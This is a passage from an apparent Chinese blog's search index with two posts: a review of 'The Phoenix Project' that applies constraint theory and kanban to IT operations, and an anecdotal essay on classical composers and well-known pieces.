Context机制 | 时间： 2016-08-02 Go语言实战笔记（二十）| Go Context | May 12, 2017]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Linux</tag>
        <tag>OpenSource</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DevOps 漫谈：从作坊到工厂的寓言故事]]></title>
    <url>%2F2018%2F04%2F10%2FDevOps-Phoenix%2F</url>
    <content type="text"><![CDATA[摘要 背景：《凤凰项目》的灵魂 管理约束：最大的瓶颈是人 任务追踪：可视化工作区和看板实践 改进日常工作：预防性维护 反常识：系统里要经常出些故障、人力资源使用率与效率成反比 安全与审计 IT 价值流：像电力一样无处不在 转变主要不是基于自动化，相反，这种不可思议的改进来自于调整关于工作系统的策略和控制半成品的策略，确保有一个高效的跨职能团队，让所有事情都为约束点服务，以及管理好工作交接。——《凤凰项目 一个IT运维的传奇故事》 谈到 DevOps 概念，有几本书是绕不过去的，《凤凰项目：一个IT运维的传奇故事》（The Phoenix Project:a Novel About IT,DevOps,and Helping Your Business Win）就是其中之一。本书的主要特色之一是将 IT 运营和工厂生产对应起来，借鉴制造业的经验提升 IT 价值。 背景：《凤凰项目》的灵魂《凤凰项目》的作者金(Gene Kim);贝尔(Kevin Behr);斯帕福德(George Spafford)，显然是高德拉特的拥趸。在整个故事中都贯穿了高德拉特的思想——约束理论(限制理论，Theory of Constraints，TOC)。 “不应该根据第一个工作站的效率来安排工作，而是根据瓶颈资源所能完成工作的速度来安排工作。” 埃利亚胡·高德拉特博士（Eliyahu M. Goldratt，1947－2011），以色列物理学家，同时是一位企业管理领域的大师。1984年，高德拉特博士发表了他的重要著作《目标：一种持续改进的流程》（The Goal: A Process of On going Improvement），书中以小说的形式提出了约束理论。他主张一个复杂的系统隐含着简单化，即使在任何时间，一个复杂的系统可能是由成千上万人和一系列设备所组成，但是只有非常少的变数或许只有一个，称为限制，它会限制（或阻碍）此系统达到更高的目标。在此基础上，他进一步提出了在制造业经营生产活动中定义和消除制约因素的一些规范化方法以支持连续改进（Continuous Improvement），例如约束理论之外还提出了关键链（Critical Chain Project Management，CCPM）项目规划和管理方法（与关键路径分析方法不同，它主要侧重于项目执行中所需的资源，关注资源依赖，强调监测项目的进展和缓冲的使用率，而不是规划个别任务的进展速度）。精益生产或者丰田生产系统在某种程度上也是以约束理论为基础的。 回到《凤凰项目》，它的体裁是按照时间线叙事的日记体：临危受命的主人公一直致力于改善各个约束点（瓶颈）对于整个组织能力的限制。起初是一个无可替代的工程师，接着是应用程序部署流程，安全审计，最后约束点移到了技术部门之外，甚至包括外部供应商。简单来说，小说的脉络遵循实践约束理论的基本步骤： 识别约束点； 利用约束点； 让所有其他活动都从属于约束点； 把约束点提升到新的水平； 寻找下一个约束点。 管理约束 “在瓶颈之外的任何地方作出的改进都是假象，在瓶颈之后作出任何改进都是徒劳的，而在瓶颈之前作出的任何改进则只会导致瓶颈处堆积更多的库存。” —— 艾利·高德拉特 最大的瓶颈是人如果希望通过这本书获得一些解决方案和技术细节的人估计要失望了，《凤凰项目》本质上是一本探讨如何提高组织效率的书，或者说主要是讨论人、顺带谈了一些协同方法论。 我相信很多人看完《凤凰项目》之后都会把故事里面里面一堆人物名字搞混，但是有一个角色甚至比较主角还有意思 —— 布伦特。个人能力超强，工作超努力，对各类技术细节了如指掌，所有大小项目大家都喜欢找他合作，有了问题也会第一时间想到他，典型的超级员工、英雄人物。与此同时，布伦特实际上并不像人们认为的那样聪明绝顶。他每天需要处理大量计划外工作，即使布伦特天天加班都完不成堆积如山的任务，最终造成了大量的任务积压，战略工作不断延期，管理层疲于应付各种投诉。我相信大多数发展中组织里面都会有这么一个角色存在。 新上任的主人公（比尔）将布伦特识别为 IT 生产环境中的约束点，并采取了更改工作流转的方式来避免布伦特被计划外工作打扰： 与 CEO 达成共识，调整布伦特的工作职责：允许他拒绝除凤凰项目（战略级）以外的任何工作； 设置资源防火墙，任何人需要“征用”他都必须经过其部门领导评估优先级，所有资源请求通过层层过滤才能达到布伦特； 围绕布伦特组建了一个二线梯队，负责学习他的工作经验、编写文档、甚至实现部分自动化，逐步替代布伦特处理任务，将布伦特从各种繁琐的事情中解放出来 可能他是故意让自己显得无可或缺，以免其他人抢了他的工作。… 是不是布伦特把他的知识看作一种权力。也许他身上的某些部分不愿意把那些知识交出来。这也确实让他成为了几乎难以取代的人。——《凤凰项目 一个IT运维的传奇故事》 第 107 页 值得注意的是，新的决策在开始阶段需要承受了很大的压力。领导人需要对抗的是长期形成的工作惯性，俗话说“病来如山倒、病去如抽丝”，想要改变也不是一朝一夕就可以实现的，更不要说组织内部微妙的人事关系，稍有不慎就可能踩到雷，顺畅的内部沟通、群众看得到的改进效果可以帮助解决一部分问题，但是现实中也有不可避免的碰撞。所以说，流程变更实质是是组织文化重塑的一种形式，领导者的信任与合作必不可少。这方面也是本书比较有趣的地方。 经过一段时间的坚持，布伦特的工作效率大大提升，顺利完成了凤凰项目，并在后来发起的独角兽和独角鲸项目取得了成功。 任务追踪凤凰项目故事中，主人公面对的困境是：IT 团队因为大量工作积压而导致各种任务延期。 这个世界一定是哪里不对劲了，一半邮件都是紧急邮件。所有事情都那么重要，这可能吗？ 经过一番梳理，IT 团队的各类工作内容大致可以分为以下四种类别： 第一类：业务项目，由 PMO 跟踪的正式项目； 第二类：IT 内部项目，由业务项目衍生的基础架构项目，或者改进项目；（* 生产能力投放度量） 第三类：变更（* 跨团队交接和重复跟踪） 第四类：计划外工作（救火工作） 计划外工作可不是免费的，恰恰相反，它非常昂贵。在故事的第一部分，计划外工作是最主要的困扰，它们包括突发严重故障、业务安全漏洞引发的舆论风波、部分领导人基于个人意愿追加的临时项目等等。如果要推动战略项目的进度，必须根除计划外工作的最大源头！ 计划外工作会让你丧失开展计划内工作的能力，因此必须不惜一切代价去消灭计划外工作，墨菲法则确实存在，因此总会有计划外工作，但你必须高效地处理它们。 第一优先级是谁喊得最响，决定因素是谁能搬出最大的领导来。我见过很多员工总是优先为某个经理服务，因为他每月带他们出去吃一次午餐。 为了改变这一局面，主人公采用了一种“可视化工作区+任务追踪系统”的方式管理变更。 任务可视化可视化的目的是为了做到充分的交流，就像风吹过树林，不分彼此的摇动每一片树叶。 可视化工作区运营中心（NOC）：一个巨大的开放式办公区域，靠一面墙放着一排长桌，巨大的显示器上显示着所有IT服务的各种状态。1级和2级客服人员占据了工作站的三排位置。“这并不是阿波罗13号的太空飞行指挥中心，但我就是这样向亲戚们解释我的工作环境的。” 在 NOC 运作的具体支撑手段上，高度重视看板墙（Kanban）的作用。 看板(Kanban)是一种生产管理系统，起源于1940年代的丰田汽车公司。看板的核心理论是基于制造业中经常提到的概念：库存。与传统会计观念不同，丰田认为库存会带来成本以及浪费，而不是增加或储存价值，应鼓励逐步消除库存，以便削减生产流程中的成本，在管理中逐渐适应“零库存”的状态。1961 年 MIT（Sloan School of Management）教授 John Little 正式提出了利特尔法则（ Little’s Law ）：在一个稳定的系统 L中，长期的平均顾客人数，等于长期的有效抵达率，系统中的平均存货等于存货单位离开系统的比率（亦即平均需求率）与存货单位在系统中平均时间的乘积。 Cycle Time = Work in Progress / Throughput 根据利特尔法则，跟踪工作及进展的最重要的目标是：限制在制品（Work in process，WIP），例如尚未完成制造过程的商品，或是停留在库存仓库或是产线上，等待着进一步处理的商品。在 IT 语境中，半成品一般意味着积压的开发任务、等待启动的“重要不紧急”工作、“开发完成”但是未上线发布的新功能、等待执行的线上变更等等。 看板上的索引卡片是做成这件事最好的机制之一，因为每个人都能看到半成品。—— 《凤凰项目 一个IT运维的传奇故事》第 151 页 本书中关于看板（Kanban）实践的启示可以概括为以下几点： 目标导向：相对于强化审批流程，更重要的是通过任务卡片的梳理识别半成品积压在哪个环节，通过建立一条反馈环路能够一直往回通向产品定义、设计及开发的最初环节。 简洁性：例如一张变更索引卡片只要求填写必需的三条信息：变更计划的制定者、将要实施变更的系统以及一条一句话的概述，避免设置过多的必填字段和无效选项。繁琐而缺乏人性考量的工具难以发挥作用，最终将变成 “大家为了完成自己的工作，一直在胡乱对付这套系统”，再也没有比阻止人们去做他们理应做的事更能毁掉大家的热情和支持了。 灵活性：针对需要特别关注的问题可以采取灵活方式，不拘泥于死板格式。例如在第一部分首席工程师（布伦特）是一个阶段性瓶颈，各部门在提交卡片的时候就将“是否需要布伦特支援”作为必填信息，或者使用单独一种颜色的卡片。 控制半成品的能力不足，是造成长期性延误和质量问题的根源之一。 “完成”的真正定义 并非开发部完成了编码，而是只有在代码经过充分测试并按设计在生产中运行时，代码才算“完成”。 关于变更管理，还有一些具体的实践方法值得借鉴： 分级授权：可以把一部分变更审核委派给代理人 脆弱变更：列出了十大最脆弱的服务、应用程序和基础架构列表，可能会影响到其中任何一个的变更申请都将立刻标上记号，由 CAB 详细审查 标准变更（ITIL 名称）：对于之前已多次成功实施的变更，我们只需要提前批准就行。它们仍然需要提交，但可以不经过我们批准就安排操作日程。” 外部影响变更：对于‘复杂的中等变更’ 变更提交者有责任向可能受到影响的人员进行咨询并得到其认可，做完这些之后才可以将变更卡片送入审核流程。 禁止条款（透明化）：禁止未经授权的变更，禁止在服务中断期间出现未经公开的变更。 改进日常工作 改进日常工作比开展日常工作更重要。 预防性维护 技术债务。它来自于走捷径，那在短时间内也许行得通。但是就像金融债务一样，久而久之，利息成本会越滚越高。如果一个部门没有付清它的技术债务，公司的每一份努力都将以计划外工作的形式来偿还那些技术债务的利息。p186 如果你是一家跨国货运公司，你们用一百辆卡车组成的车队运送包裹，你们的一项公司目标就会是客户满意度和按时交货。一个影响按时交货的因素是车辆故障。车辆故障的一个关键起因是没有更换机油。那么，为了降低这个风险，你就要为车辆运营建立一个服务等级协议（SLA），每行驶五千英里就要更换一次机油。如果说按时交货是关键绩效指标（KPI），那么为了达到这个指标可以建立一个新的前瞻性KPI，比如说，已经按要求更换机油的车辆百分比。 对于 IT 组织来说，这一原则同样适用。 两个反常识的概念系统里要经常出些故障作者在书中提到一个观点：“系统里要经常出些故障，长此以往，再遇到困难就没有原来那么痛苦了。p216” 1960 年代，工业制造领域提出了弹性制造系统（Flexible Manufacturing System，FMS）的概念。FMS 的理想是制造系统能够富有弹性（能够因应预期或不可预期的变更），又兼有自动化设备规模生产的特性，以满足顾客对于产品要求多样化的趋势。制造系统的弹性通常被分为两类： “机器弹性”：涵盖了系统制造新产品的应变能力和零件工序改变的应变能力； “用途弹性”：同一组件可以使用不同机器设备而运行相同的工序之。 于 IT 生产而言，就有了弹性系统，即面对各种不确定场景时（如基础存储设施故障，恶意攻击，依赖服务故障，网络超时、中断等等）都能够存活并且具备一定的自愈能力的系统。弹性系统的出发点是承认在规模化服务的场景下，故障是常态的、不可预测的，既然不可避免，就需要在系统的生命周期去主动管理它，可以主动地给系统不断施加一些压力，从而不断强化习惯并加以改进。 Do not try to avoid failures ! Embrace them ! 具体策略方面，可以将改进周期设定为小段时间，例如每次为期两周，每期都实施一个小型的改进项目，例如周期性的服务中断演练。每次日常改进都需要覆盖“设计—检测—恢复—预防”的各个环节，只有不断重复才能建立信任感和透明度，对需要团队合作的事情来说尤其如此。 建立起部落文化般的工作共识，这帮助我们比以往任何时候都能够更快地排除故障，而且，一旦真的需要把工作升级，也是可控而有序的。p263 人力资源使用率与效率成反比每个人都需要空闲时间，或者说松弛时间。如果大家都没有松弛时间，半成品就会卡在系统里。或者更确切地说，卡在队列里，只是干等着。 图表说明：横坐标轴上是给定资源的忙碌百分比，纵坐标轴上是大致的等待时间（更确切地说是队列长度）。曲线的形状表明，当资源使用率超过80%时，等待时间就会直线上升。 等待时间取决于资源使用率。如果一个资源的忙碌时间是50%，那么它的空闲时间也是 50%。等待时间就是50%除以50%，也就是一个时间单位（可以简化理解为 1 个小时）。另一方面，如果一个资源 90% 的时间是忙碌的，等待时间=90% /10%，也就是说至少 9 个小时。换言之，任务排队等待的时间，将是资源有 50% 空闲时的 9 倍。 例如，小说中的技术大拿（布伦特），30分钟的简单变更需要耗费几个星期才能完成。原因很简单，作为所有工作的瓶颈，布伦特的使用率一直是100%甚至超过100%，因此，每次交给他的工作都只能在队列里枯等，如果不进行加速或升级处置，就永远不会完成。 再进一步，如果简单任务实际需要 5 个以上交接步骤（分析、设计、程序、测试、发布、线上变更等），情况又会如何呢？假设所有工作中心都有 90% 的时间是忙碌的，由图上可知，在每一个工作中心的平均等待时间是 9 个小时。总共等待时间就是 5倍：45 个小时。高资源使用率带来的破坏性结果恐怕也就无需多言了。 因此，削减非必要人工环节、管理交接工作是提高资源周转率的关键。 安全与审计 信息安全部总是到处亮出他们的“尚方宝剑”，提出各种紧急要求，全然不顾这样做对其他部门造成的后果，因此我们有很多会议都不邀请他们参加。只要有他们在，事情肯定办不成。p35 一些最英明的审计师说，只有三种内部控制目标：确保财务报告的可靠性，符合法律法规，以及运营的效率和效果。就是这样。你和约翰所谈论的正是所谓‘COSO立方’（内部控制整合框架）的不同面。” p241 本书故事中着重探讨了信息安全与审计工作，例如技术部门与内部审计部门的矛盾冲突、将安全审计置于开发构建过程之中等挺有意思的。这块比较复杂，以后再补充。 IT 价值流：像电力一样无处不在 IT 不只是一个部门。相反，它就像电力一样无处不在。IT 是一种技能，就像能读会算一样。在无极限零部件公司，我们没有一个集中的阅读或计算部门——我们希望每一个雇员都多少掌握这些技能。理解技术能够做什么、不能做什么，已经成为这家公司里每个部门必须具备的一种核心竞争力。要是业务经理领导了一个不具备这种技能的团队或项目，他们就会失败。——《凤凰项目 一个IT运维的传奇故事》第 316 页 扩展阅读DevOps 漫谈系列 《凤凰项目》：从作坊到工厂的寓言故事 Kanban 看板管理实践 DevOps 漫谈：基础设施部署和配置管理 Linux 容器安全的十重境界 工程师的自我修养：全英文技术学习实践 DevOps 实践的本质是文化 学习力－团队生命之根 带领团队翻译书籍 Don’t make me think 凡是被很多人不断重复的好习惯，要将其自动化整合到工具 凤凰项目作者推荐书单 《The DevOps Cookbook》(开发运维指导书) 《持续交付：发布可靠软件的系统方法》 《目标：一种持续改进的流程》1984年，埃利亚胡·高德拉特博士撰写了他的重要著作《目标：一种持续改进的流程》（The Goal: A Process of On going Improvement）。这是一本苏格拉底式的小说，主人公是一位名叫亚历克斯·罗戈的工厂经理，他必须在90天内解决成本和按时交货的问题，否则他的工厂就要被关停。 高德拉特博士在他的后一本书 《绝不是靠运气》（It’s Not Luck） 中，阐述了他称之为“思维过程”的内容。那是一套了不起的方法论（但是多少有些难以做到，且往往见效缓慢），主要是教公司如何识别长期的核心冲突、了解现状、描述理想的未来状况，以及多种提高成功可能性的策划技巧。 华盛顿州立大学网站“EM526 约束管理”（课程），http://public.wsu.edu/~engrmgmt/holt/em530/index.htm 学习“思维过程”的教科书《逻辑化思维过程》，作者H.威廉·德特曼博士。 《丰田管理：为了获得改进、适应性和优异业绩而管理员工》 Toyota Kata : Managing People for Improvement , Adaptive nessand SuperiorResults 《团队领导的五大障碍：关于领导力的寓言》 The Five Dysfunction sofa Team : A Leader ship Fable 作者：帕特里克·兰西奥尼 团队达成目标的一个核心诱因是信任缺失。在他的模型中，五大障碍被描述为： 信任缺失——不愿在团队中显示弱点； 惧怕冲突——在充满激情的建设性辩论中寻求和谐的假象； 缺乏诚意——假意与团队的决策达成一致，形成模棱两可的公司氛围； 回避问责——面对员工的失职行为，逃避追责，降低了工作标准； 忽视结果——对个人成就、地位和自我价值的关注超过了对团队成功的关注。 参考文献 豆瓣|《凤凰项目|The Phoenix Project》 《凤凰项目》内容梳理|龙井的博客 The Cybersecurity Canon: The Phoenix Project: A Novel About IT, DevOps, and Helping Your Business Win 以色列物理学家、约束理论创始人埃利亚胡·戈德拉特逝世 | 2011 年 弹性工程-构建弹性系统|曾绿麟|美团]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[古典音乐低俗史]]></title>
    <url>%2F2018%2F04%2F10%2FArtistic-Classical%2F</url>
    <content type="text"><![CDATA[摘要 古典音乐低俗史 古典音乐经典名曲 歌剧院中的巴黎人却呵欠连天。他们裹着厚厚的丝绸和皮草，沉溺于社会发展和帝国传承所累积的财富，他们看不到，用不了多久，他们的平静就会被瓦格纳歌剧中预言的“狂飙突进运动”打破。19世纪60年代尚未过去，他们的城市就将被德意志的军队占领，他们的殿堂、房屋和医院都将被德意志人的炮弹粉碎。唐怀瑟精神的苏醒喻示着德意志民族的觉醒，这个民族重新认识到了自己的力量。然而对此，巴黎人却视而不见。—— 《帝国的铸就 FORGE OF EMPIRES 1861-1871》 古典音乐低俗史 “没有音乐，生活将是一种错误。” —— 尼采 今年的3月25日，是法国现代最伟大的音乐家、被称为“现代音乐之父”的阿希尔-克洛德·德彪西（Achille-Claude Debussy，1862－1918）逝世100周年。德彪西在生前已享誉厚载，是法兰西学院院士，是鲜有的头像被印在法郎纸币上的法国音乐家之一。 德彪西的作品在传统法国音乐风格中，结合了东方音乐、西班牙舞曲和爵士乐的特点，创造出了其别具一格的和声。德彪西被总括为印象派音乐的代表，虽然他本人并不同意，甚至设法远离这一称谓。德彪西的一生经历的女性数不胜数，其中至少两次发生自杀事件： 玛丽·布兰奇·瓦斯尼尔：年长德彪西十一岁的人妻； 加布里埃尔·杜邦（加比，Gaby）：与德彪西同甘共苦以支持家用，但是被德彪西无情抛弃，引发了自杀风波； 特蕾丝·罗杰：32岁的女歌手，突然宣布结婚但是在婚礼和婚房都准备完毕时发现了加比的存在，单方面宣布解除婚约； 莉莉（Lily）: 女性服装店模特，比德彪西小十一岁；她生病时德彪西与爱玛私奔，企图用手枪自杀（未遂）； 爱玛（Emma)：德彪西的钢琴学生的母亲，富裕的银行家的妻子，与德彪西同龄；在世人眼中，他们的关系只是为了金钱。 《春之祭》（Le Sacre du Printemps）是俄罗斯作曲家伊戈尔·斯特拉文斯基的代表作与成名作。全曲粗犷而又有浓郁的俄罗斯风格，是二十世纪古典音乐创作的典范。斯特拉文斯基幻想出一个俄罗斯远古时期的祭祖仪式景象：“我想像到一个肃穆的异教祭典：一群长老围成一圈坐着，看见一位少女被要求跳舞直至跳死。她是他们用以祭祀春天之神的祭品。” 音乐史上，《春之祭》的首演便是一场著名的骚乱。 1913 年巴黎香榭丽舍剧院举行首演时，狂乱的节奏及旋律，颠覆传统芭蕾的舞步，都让观众陷入疯狂，支持者和反对者在席间互相叫嚣，甚至大打出手：从管弦乐团的序奏开始，观众席上不满的声音便此起彼伏、骂声不断，强烈的抗议声和对抗议声的抗议声竞相交错，嘘声、口哨、踏步声、拍手声不绝于耳。 巴洛克时代，最优秀的乐团一般由教会与贵族赞助。贵族在乡村建立城堡或宫殿，并雇用一支常驻乐队来凸显自身品味，甚至还有宫廷御用的乐队作曲家写作大量新乐曲，歌剧也日益流行。1781年，莱比锡布商大厦管弦乐团成立，标志着市民管弦乐团的开始，1842年，著名的纽约爱乐乐团和维也纳爱乐乐团陆续成立。19世纪这种属于中产市民(在贵族或教会眼中，他们大概也是粗俗、缺乏教养的同义词）的乐队形式随着城市中产阶级崛起而发展迅速。 然而，观众席中有一个人（可可·香奈儿）注意到了这位被观众的喧哗沉重打击的音乐天才，电影《香奈儿秘密情史》 中完美重现了这一场景。 “音乐表现越是本质、单纯，效果也就越直接、强烈。” —— 奥尔夫 《布兰诗歌》源自德国巴伐利亚的布兰修道院（Burana，始建于公元 740 年）中发现的一本 13 世纪手稿 —— 由神职人员、落魄文人和流浪学生们用拉丁文和中世纪德语记录的诗歌集，20 世纪由作曲家卡尔·奥尔夫编写成曲。 这首曲中所唱的题材无外乎三个：春、酒还有求爱。比如第 14 曲 “我在酒吧的时候”，歌词极其简单粗暴： 太太喝，先生喝；大兵喝，牧师喝；男人喝，女人喝；白人喝，黑人喝；成家立业的喝，漂泊无依的喝；蠢东西喝，聪明人喝，穷鬼同病夫喝…… 可以说，这是一首相当享乐的音乐。有关《求爱》的歌词也是类似的内容，马力全开。放荡不羁的精神,对放浪形骸的生活方式的赞美以及对封建社会的无情嘲讽都令人惊讶。毫无疑问，这些被称作”中世纪的拉丁抒情诗”的作品出现在以基督教文化为中心的时代，不能不说是一个奇迹。 如果考虑到此曲创作于 1937 年的纳粹德国，这样欲望全开的歌词或许就是真实的表现。（注： 1937年7月19日，“堕落艺术展”在慕尼黑举行。这个展览是纳粹对现代艺术发起的最猛烈的攻击。展览将超过650件著名的绘画、雕塑和版画集中展出，向观众将其污蔑为“堕落”的，是应当被净化的“渣滓”。） 德国人有着一种好沉思深省的内向之感，喜幻想，多情善感；毫无疑问，正是这种性格使他们特别喜爱一种排除一切外在的兴趣而本身具备自我发展的基本要素的音乐。—— 《西方音乐史》【法】保·朗多尔米 古典音乐经典名曲奥尔夫（Orff）《Carmina Burana|布兰诗歌》拥有强力而单纯的节奏和明快的旋律，乐曲、歌词潇洒。 肖邦（Chopin）《Trois Valses Op.64 No.1 | 小狗圆舞曲》 1846-1847 法语：Trois Valses，在英语中也被称为 “Minute Waltz” 肖邦是钢琴诗人，在世人眼前浮现出来的是纤细而病弱的王子形象，较受女性欢迎。 通常的说法，肖邦是看到他的情人作家乔治·桑（George Sand）所养的一只小狗追着自己尾巴团团转的场景创作《小狗圆舞曲》，肖邦将作品献给了德费努·波特卡（Delfina Potocka）伯爵夫人。 肖邦（Chopin）《Fantasie Impromptu in C Sharp Minor Op.66 | 幻想即兴曲》《幻想即兴曲》原本是不会面世的一首作品，曲名是后人命名，肖邦留下遗言：“在我死后请烧掉曲谱。”开头的旋律美妙动人，飘荡着肖邦曲目特有的浪漫情怀。虽然甜美而热情，但也微微感到心痛。这所曲子背后肯定有一个心酸的故事，难怪肖邦本人不喜欢呵。 舒曼（Schumann）《Violin Concerto In D Minor | D小调小提琴协奏曲》舒曼是一位苦恼的艺术家形象。晚年精神失常，跳过莱茵河（又被人捞上来）、在精神病疗养院度过晚年。作品中充满了舒曼独特而浓厚的浪漫情结，第二乐章的旋律高贵而优雅。舒曼创作此曲用了2周时间，直到首次公演却过了 80 年。如果不是 1937 年，在柏林图书馆中约阿希姆的藏书中发现了乐谱，恐怕将永远被埋没。 舒伯特（Franz Schubert）《Schubert Symphony No.8 in b minor D.759 | 未完成》《未完成》真的是一部“未完成”的作品，在磁带时期的经典组合：A 面是贝多芬的《命运》，B 面则是《未完成》。 柴可夫斯基（Tchaikovsky）《The Nutcracker | 胡桃夹子》 芭蕾是沉默的。相对于管弦乐团的“谈谈阔论”，登场人物却不发一言。相对的，舞者们犹如否定中立的存在一般轻快地舞蹈。—— 【日】饭尾洋一 《古典音乐说明书》 p101 斯特拉文斯基（Stravinsky）《The Rite of Spring | 春之祭》（芭蕾音乐，1913）本来是一部芭蕾舞剧，但后来脚本遗失，只剩下管弦乐总谱。 拉威尔（Joseph-Maurice Ravel）《Concerto pour la main gauche | D大调左手钢琴协奏曲》约瑟夫-莫里斯·拉威尔（法语：Joseph-Maurice Ravel，1875年3月7日－1937年12月28日），法国作曲家和钢琴家。生于法国南部靠近西班牙的山区小城西布勒，1937年在巴黎逝世时，已经是法国乐坛中与克劳德·德彪西齐名的印象乐派作曲家。 与“两手”的协奏曲相比，“左手”的音乐构想更加严谨而独到。既有苦恼，又有诗歌般的情绪及幽默。值得一提的是，拉威尔本人在谱曲完成后立刻进行了试演出，但未能仅使用左手弹奏，而是用了双手。 拉威尔（Joseph-Maurice Ravel）《Boléro | 波莱罗舞曲》 法语名称：Boléro，1928 年拉威尔创作《波莱罗舞曲》的时候已经 53 岁。波莱罗舞曲原本指西班牙舞曲中的一种。使用小军鼓作为开篇，这个节奏重复了 169 次，持续 15 分钟有余。 情节：在西班牙的一个小酒店里，一个少女在翩翩起舞。开始时她只是缓缓跳动，舞姿优美而轻盈。随着音乐的逐渐热烈，舞蹈也越来越欢快奔放，迷住了在场的人们。他们开始随着音乐打着节拍助兴，并情不自禁地与少女一起欢舞，最后在狂欢的气氛中结束。 伦纳德·伯恩斯坦（Leonard Bernstei）《Candide Overture| 老实人·序曲》原本是作为音乐剧的开幕音乐创作。开场号角齐鸣，充满了沸腾般的跃动感，整曲精力充沛、一气呵成。 约翰·施特劳斯二世(Johann Baptist Strauss) 《An der schönen blauen Donau op.314 | 蓝色多瑙河》 德语：An der schönen blauen Donau Op.314实际上多瑙河既不清、也不美，不怎么蓝，浑浊中混杂着绿色，一如普奥战争惨败后帝国首都维也纳市民哀叹的心境。据说有了此曲之后，多瑙河两岸的人们才蓦然发现，原来多瑙河是“蓝色的”。Amazing ! 贝多芬（Ludwig van Beethoven）《The Symphony No.9 in D minor, Op.125 | 第九交响曲》《第九交响曲》不仅仅需要管弦乐团进行演奏，还需要合唱和独唱，是超过 1 个小时的巨作。该曲在世界文化界有相当重要的地位，尤其该曲第四乐章部分乐段经指挥家赫伯特·冯·卡拉扬整理后，以《欢乐颂》（Ode to Joy）之名成为欧洲联盟的官方盟歌。 埃尔加（Edward William Elgar）《Pomp and Circumstance Marches Op.39 | 威风堂堂进行曲》这首曲子经常在足球赛场上听到。英格兰许多球队的球迷都会高歌“希望与荣光之地”来鼓舞选手。 瓦格纳（Wilhelm Richard Wagner）《Wedding March | 婚礼进行曲》有名的婚礼进行曲有两种。一首是瓦格纳的婚礼进行曲，庄严肃穆；另一首是门德尔松的婚礼进行曲，华丽而隆重、充满祝福。 瓦格纳的作品是在歌剧《罗恩格林》中女主人公埃尔莎和天鹅骑士的婚礼上演奏的，代表了分离与死亡。门德尔松的看起来更吉利一些，但是，瓦格纳的故事隐喻“婚后才第一次知道对方是怎样的人”，似乎更有深意。 帕赫贝尔（Johann Pachelbel）《Canon in D Major | 卡农》作者死后200年的1919年才首次出版，过了三个世纪以上才得以成名的最强古典乐。 萨蒂（Erik Satie）《Gymnopédie |裸体歌舞》第一首治愈系经典作品。慵懒的旋律缓缓流淌，非常适合大脑一片空白，边发呆边听的音乐。 巴赫《Goldberg-Variationen，BWV 988 | 哥德堡变奏曲》据说是凯瑟琳伯爵拜托巴赫写一首适合在失眠夜听的曲子。巴赫应其要求，创作了这首超长的变奏曲大作。开篇的咏叹调平稳安详，但之后的部分却洋溢着刺激旋律，听这样的曲子真的会困吗？ 普罗科菲耶夫（Sergei Sergeyevich Prokofiev）《Cinderella,Op.87 | 灰姑娘》华尔兹普罗科菲耶夫是“遵从旧古典乐芭蕾的传统”谱写了《灰姑娘》，这首曲子用于灰姑娘出发去舞会之前的场景，在舞会舞蹈前，华尔兹已抢先开始演奏。 1941 年普罗科菲耶夫抛妻弃子，选择了 25 岁的女作家米拉·门德尔松（Mira Mendelson）。1948 年他被指责犯上了“形式主义的错误”，并被要求要注意作品的“民族性”。这件事影响了普罗科菲耶夫的健康，他的第一任夫人丽娜也因间谍嫌疑被捕（丽娜生于西班牙，在美国长大），并被判处在劳动营服役 20 年的重刑。 1953年3月5日普罗科菲耶夫去世，讽刺的是，正是当日，苦难大施主斯大林也逝世。普罗科菲耶夫曾被授予“斯大林奖”，死后被追授“列宁奖”。 德彪西（Achille-Claude Debussy）《Children’s Corner | 儿童乐园》钢琴曲集《儿童乐园》是为了德彪西刚刚 3 岁的 Chou-Chou 而作的。作品充满了温柔和幽默，还添上了给女儿的献词，连封面的设计都充满了爱意。 巴达捷夫斯卡（Tekla Bądarzewska-Baranowska）《Modlitwa dziewicy | 少女的祈祷》钢琴独奏仅有的一首由真正的少女创作的“少女名曲”。巴达捷夫斯卡创作的时候年仅 17 岁，1861 年，年仅 27 岁的巴达捷夫斯卡留下丈夫和 5 个孩子去世了。 奥涅格（Arthur Honegger，港译：康涅格）《Pacific 231 | 太平洋 231 》瑞士作曲家奥涅格（Arthur Honegger）是一位热衷于铁道的作曲家。他有一句名言，“就像其他人喜爱女性和马那样，我爱着电车”。奥涅格在交响乐《太平洋 231》中用管弦乐队还原了蒸汽列车，通过节奏变化演绎出加速感，“231” 表示的是车轴配置，前轮、动轮、辅助轮的数量分别是2个、3个、1个。 哈恰图良（Aram Il’yich Khachaturian）《Sabre Dance | 马刀舞曲》节奏快速，激烈热情。《马刀舞曲》是一篇急就章，乐曲中的焦躁感或许就是作曲者当时的心情。《马刀舞曲》的巨大成功反而衬托得作曲者其他作品都不起眼了，哈恰图良懊恼道“若知道会让其他作品失去关注的话，我就不会写了”。 乔治·比才（Georges Bizet）《Carmen | 卡门》歌剧中无人不知，无人不晓的存在。 古斯塔夫·马勒（德：Gustav Mahler）《Symphony No.1 Titan | 第一交响曲·巨人》“交响曲要像世界一样，必须要能包容万象。” 扩展阅读 古典音乐低俗史 舞台剧：南海十三郎 电影评论|灵魂解码《林肯》 电影评论|斯皮尔伯格的林肯情怀 风月集|诗三百，思无邪 世纪小说《悲惨世界》 红楼故事：佩刀沽酒作长歌 红楼故事：康熙的秘密情报系统 江南园林鉴赏|南京瞻园 摄影专辑|珠海航空航天展览 嗑药简史（四）：咖啡上瘾，喝还是不喝？ 参考文献 古典音乐欣赏从这里轻松入门 | 原创 2016-10-30 古典音乐 《 THE FENCER 》，一部真实题材的击剑作品、一部 FIE 推荐的击剑电影！ 绝望的微笑–柴可夫斯基《悲怆》交响曲 天生的激进分子：德彪西 【音乐研究】音乐品位折射你的思维 【2016-5-23】本科论文 | 纳粹德国1937年“堕落艺术展”研究 （by 骆舒星 ） @古典音乐：西方音乐发展脉络全景图 @欧美内参：德国学校是怎么教音乐的？ 纽约时报：美国“五大交响乐团”是伪概念？ 纽约爱乐 芝加哥交响乐团]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>Artistic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AI技术原理|如何选择机器学习算法？]]></title>
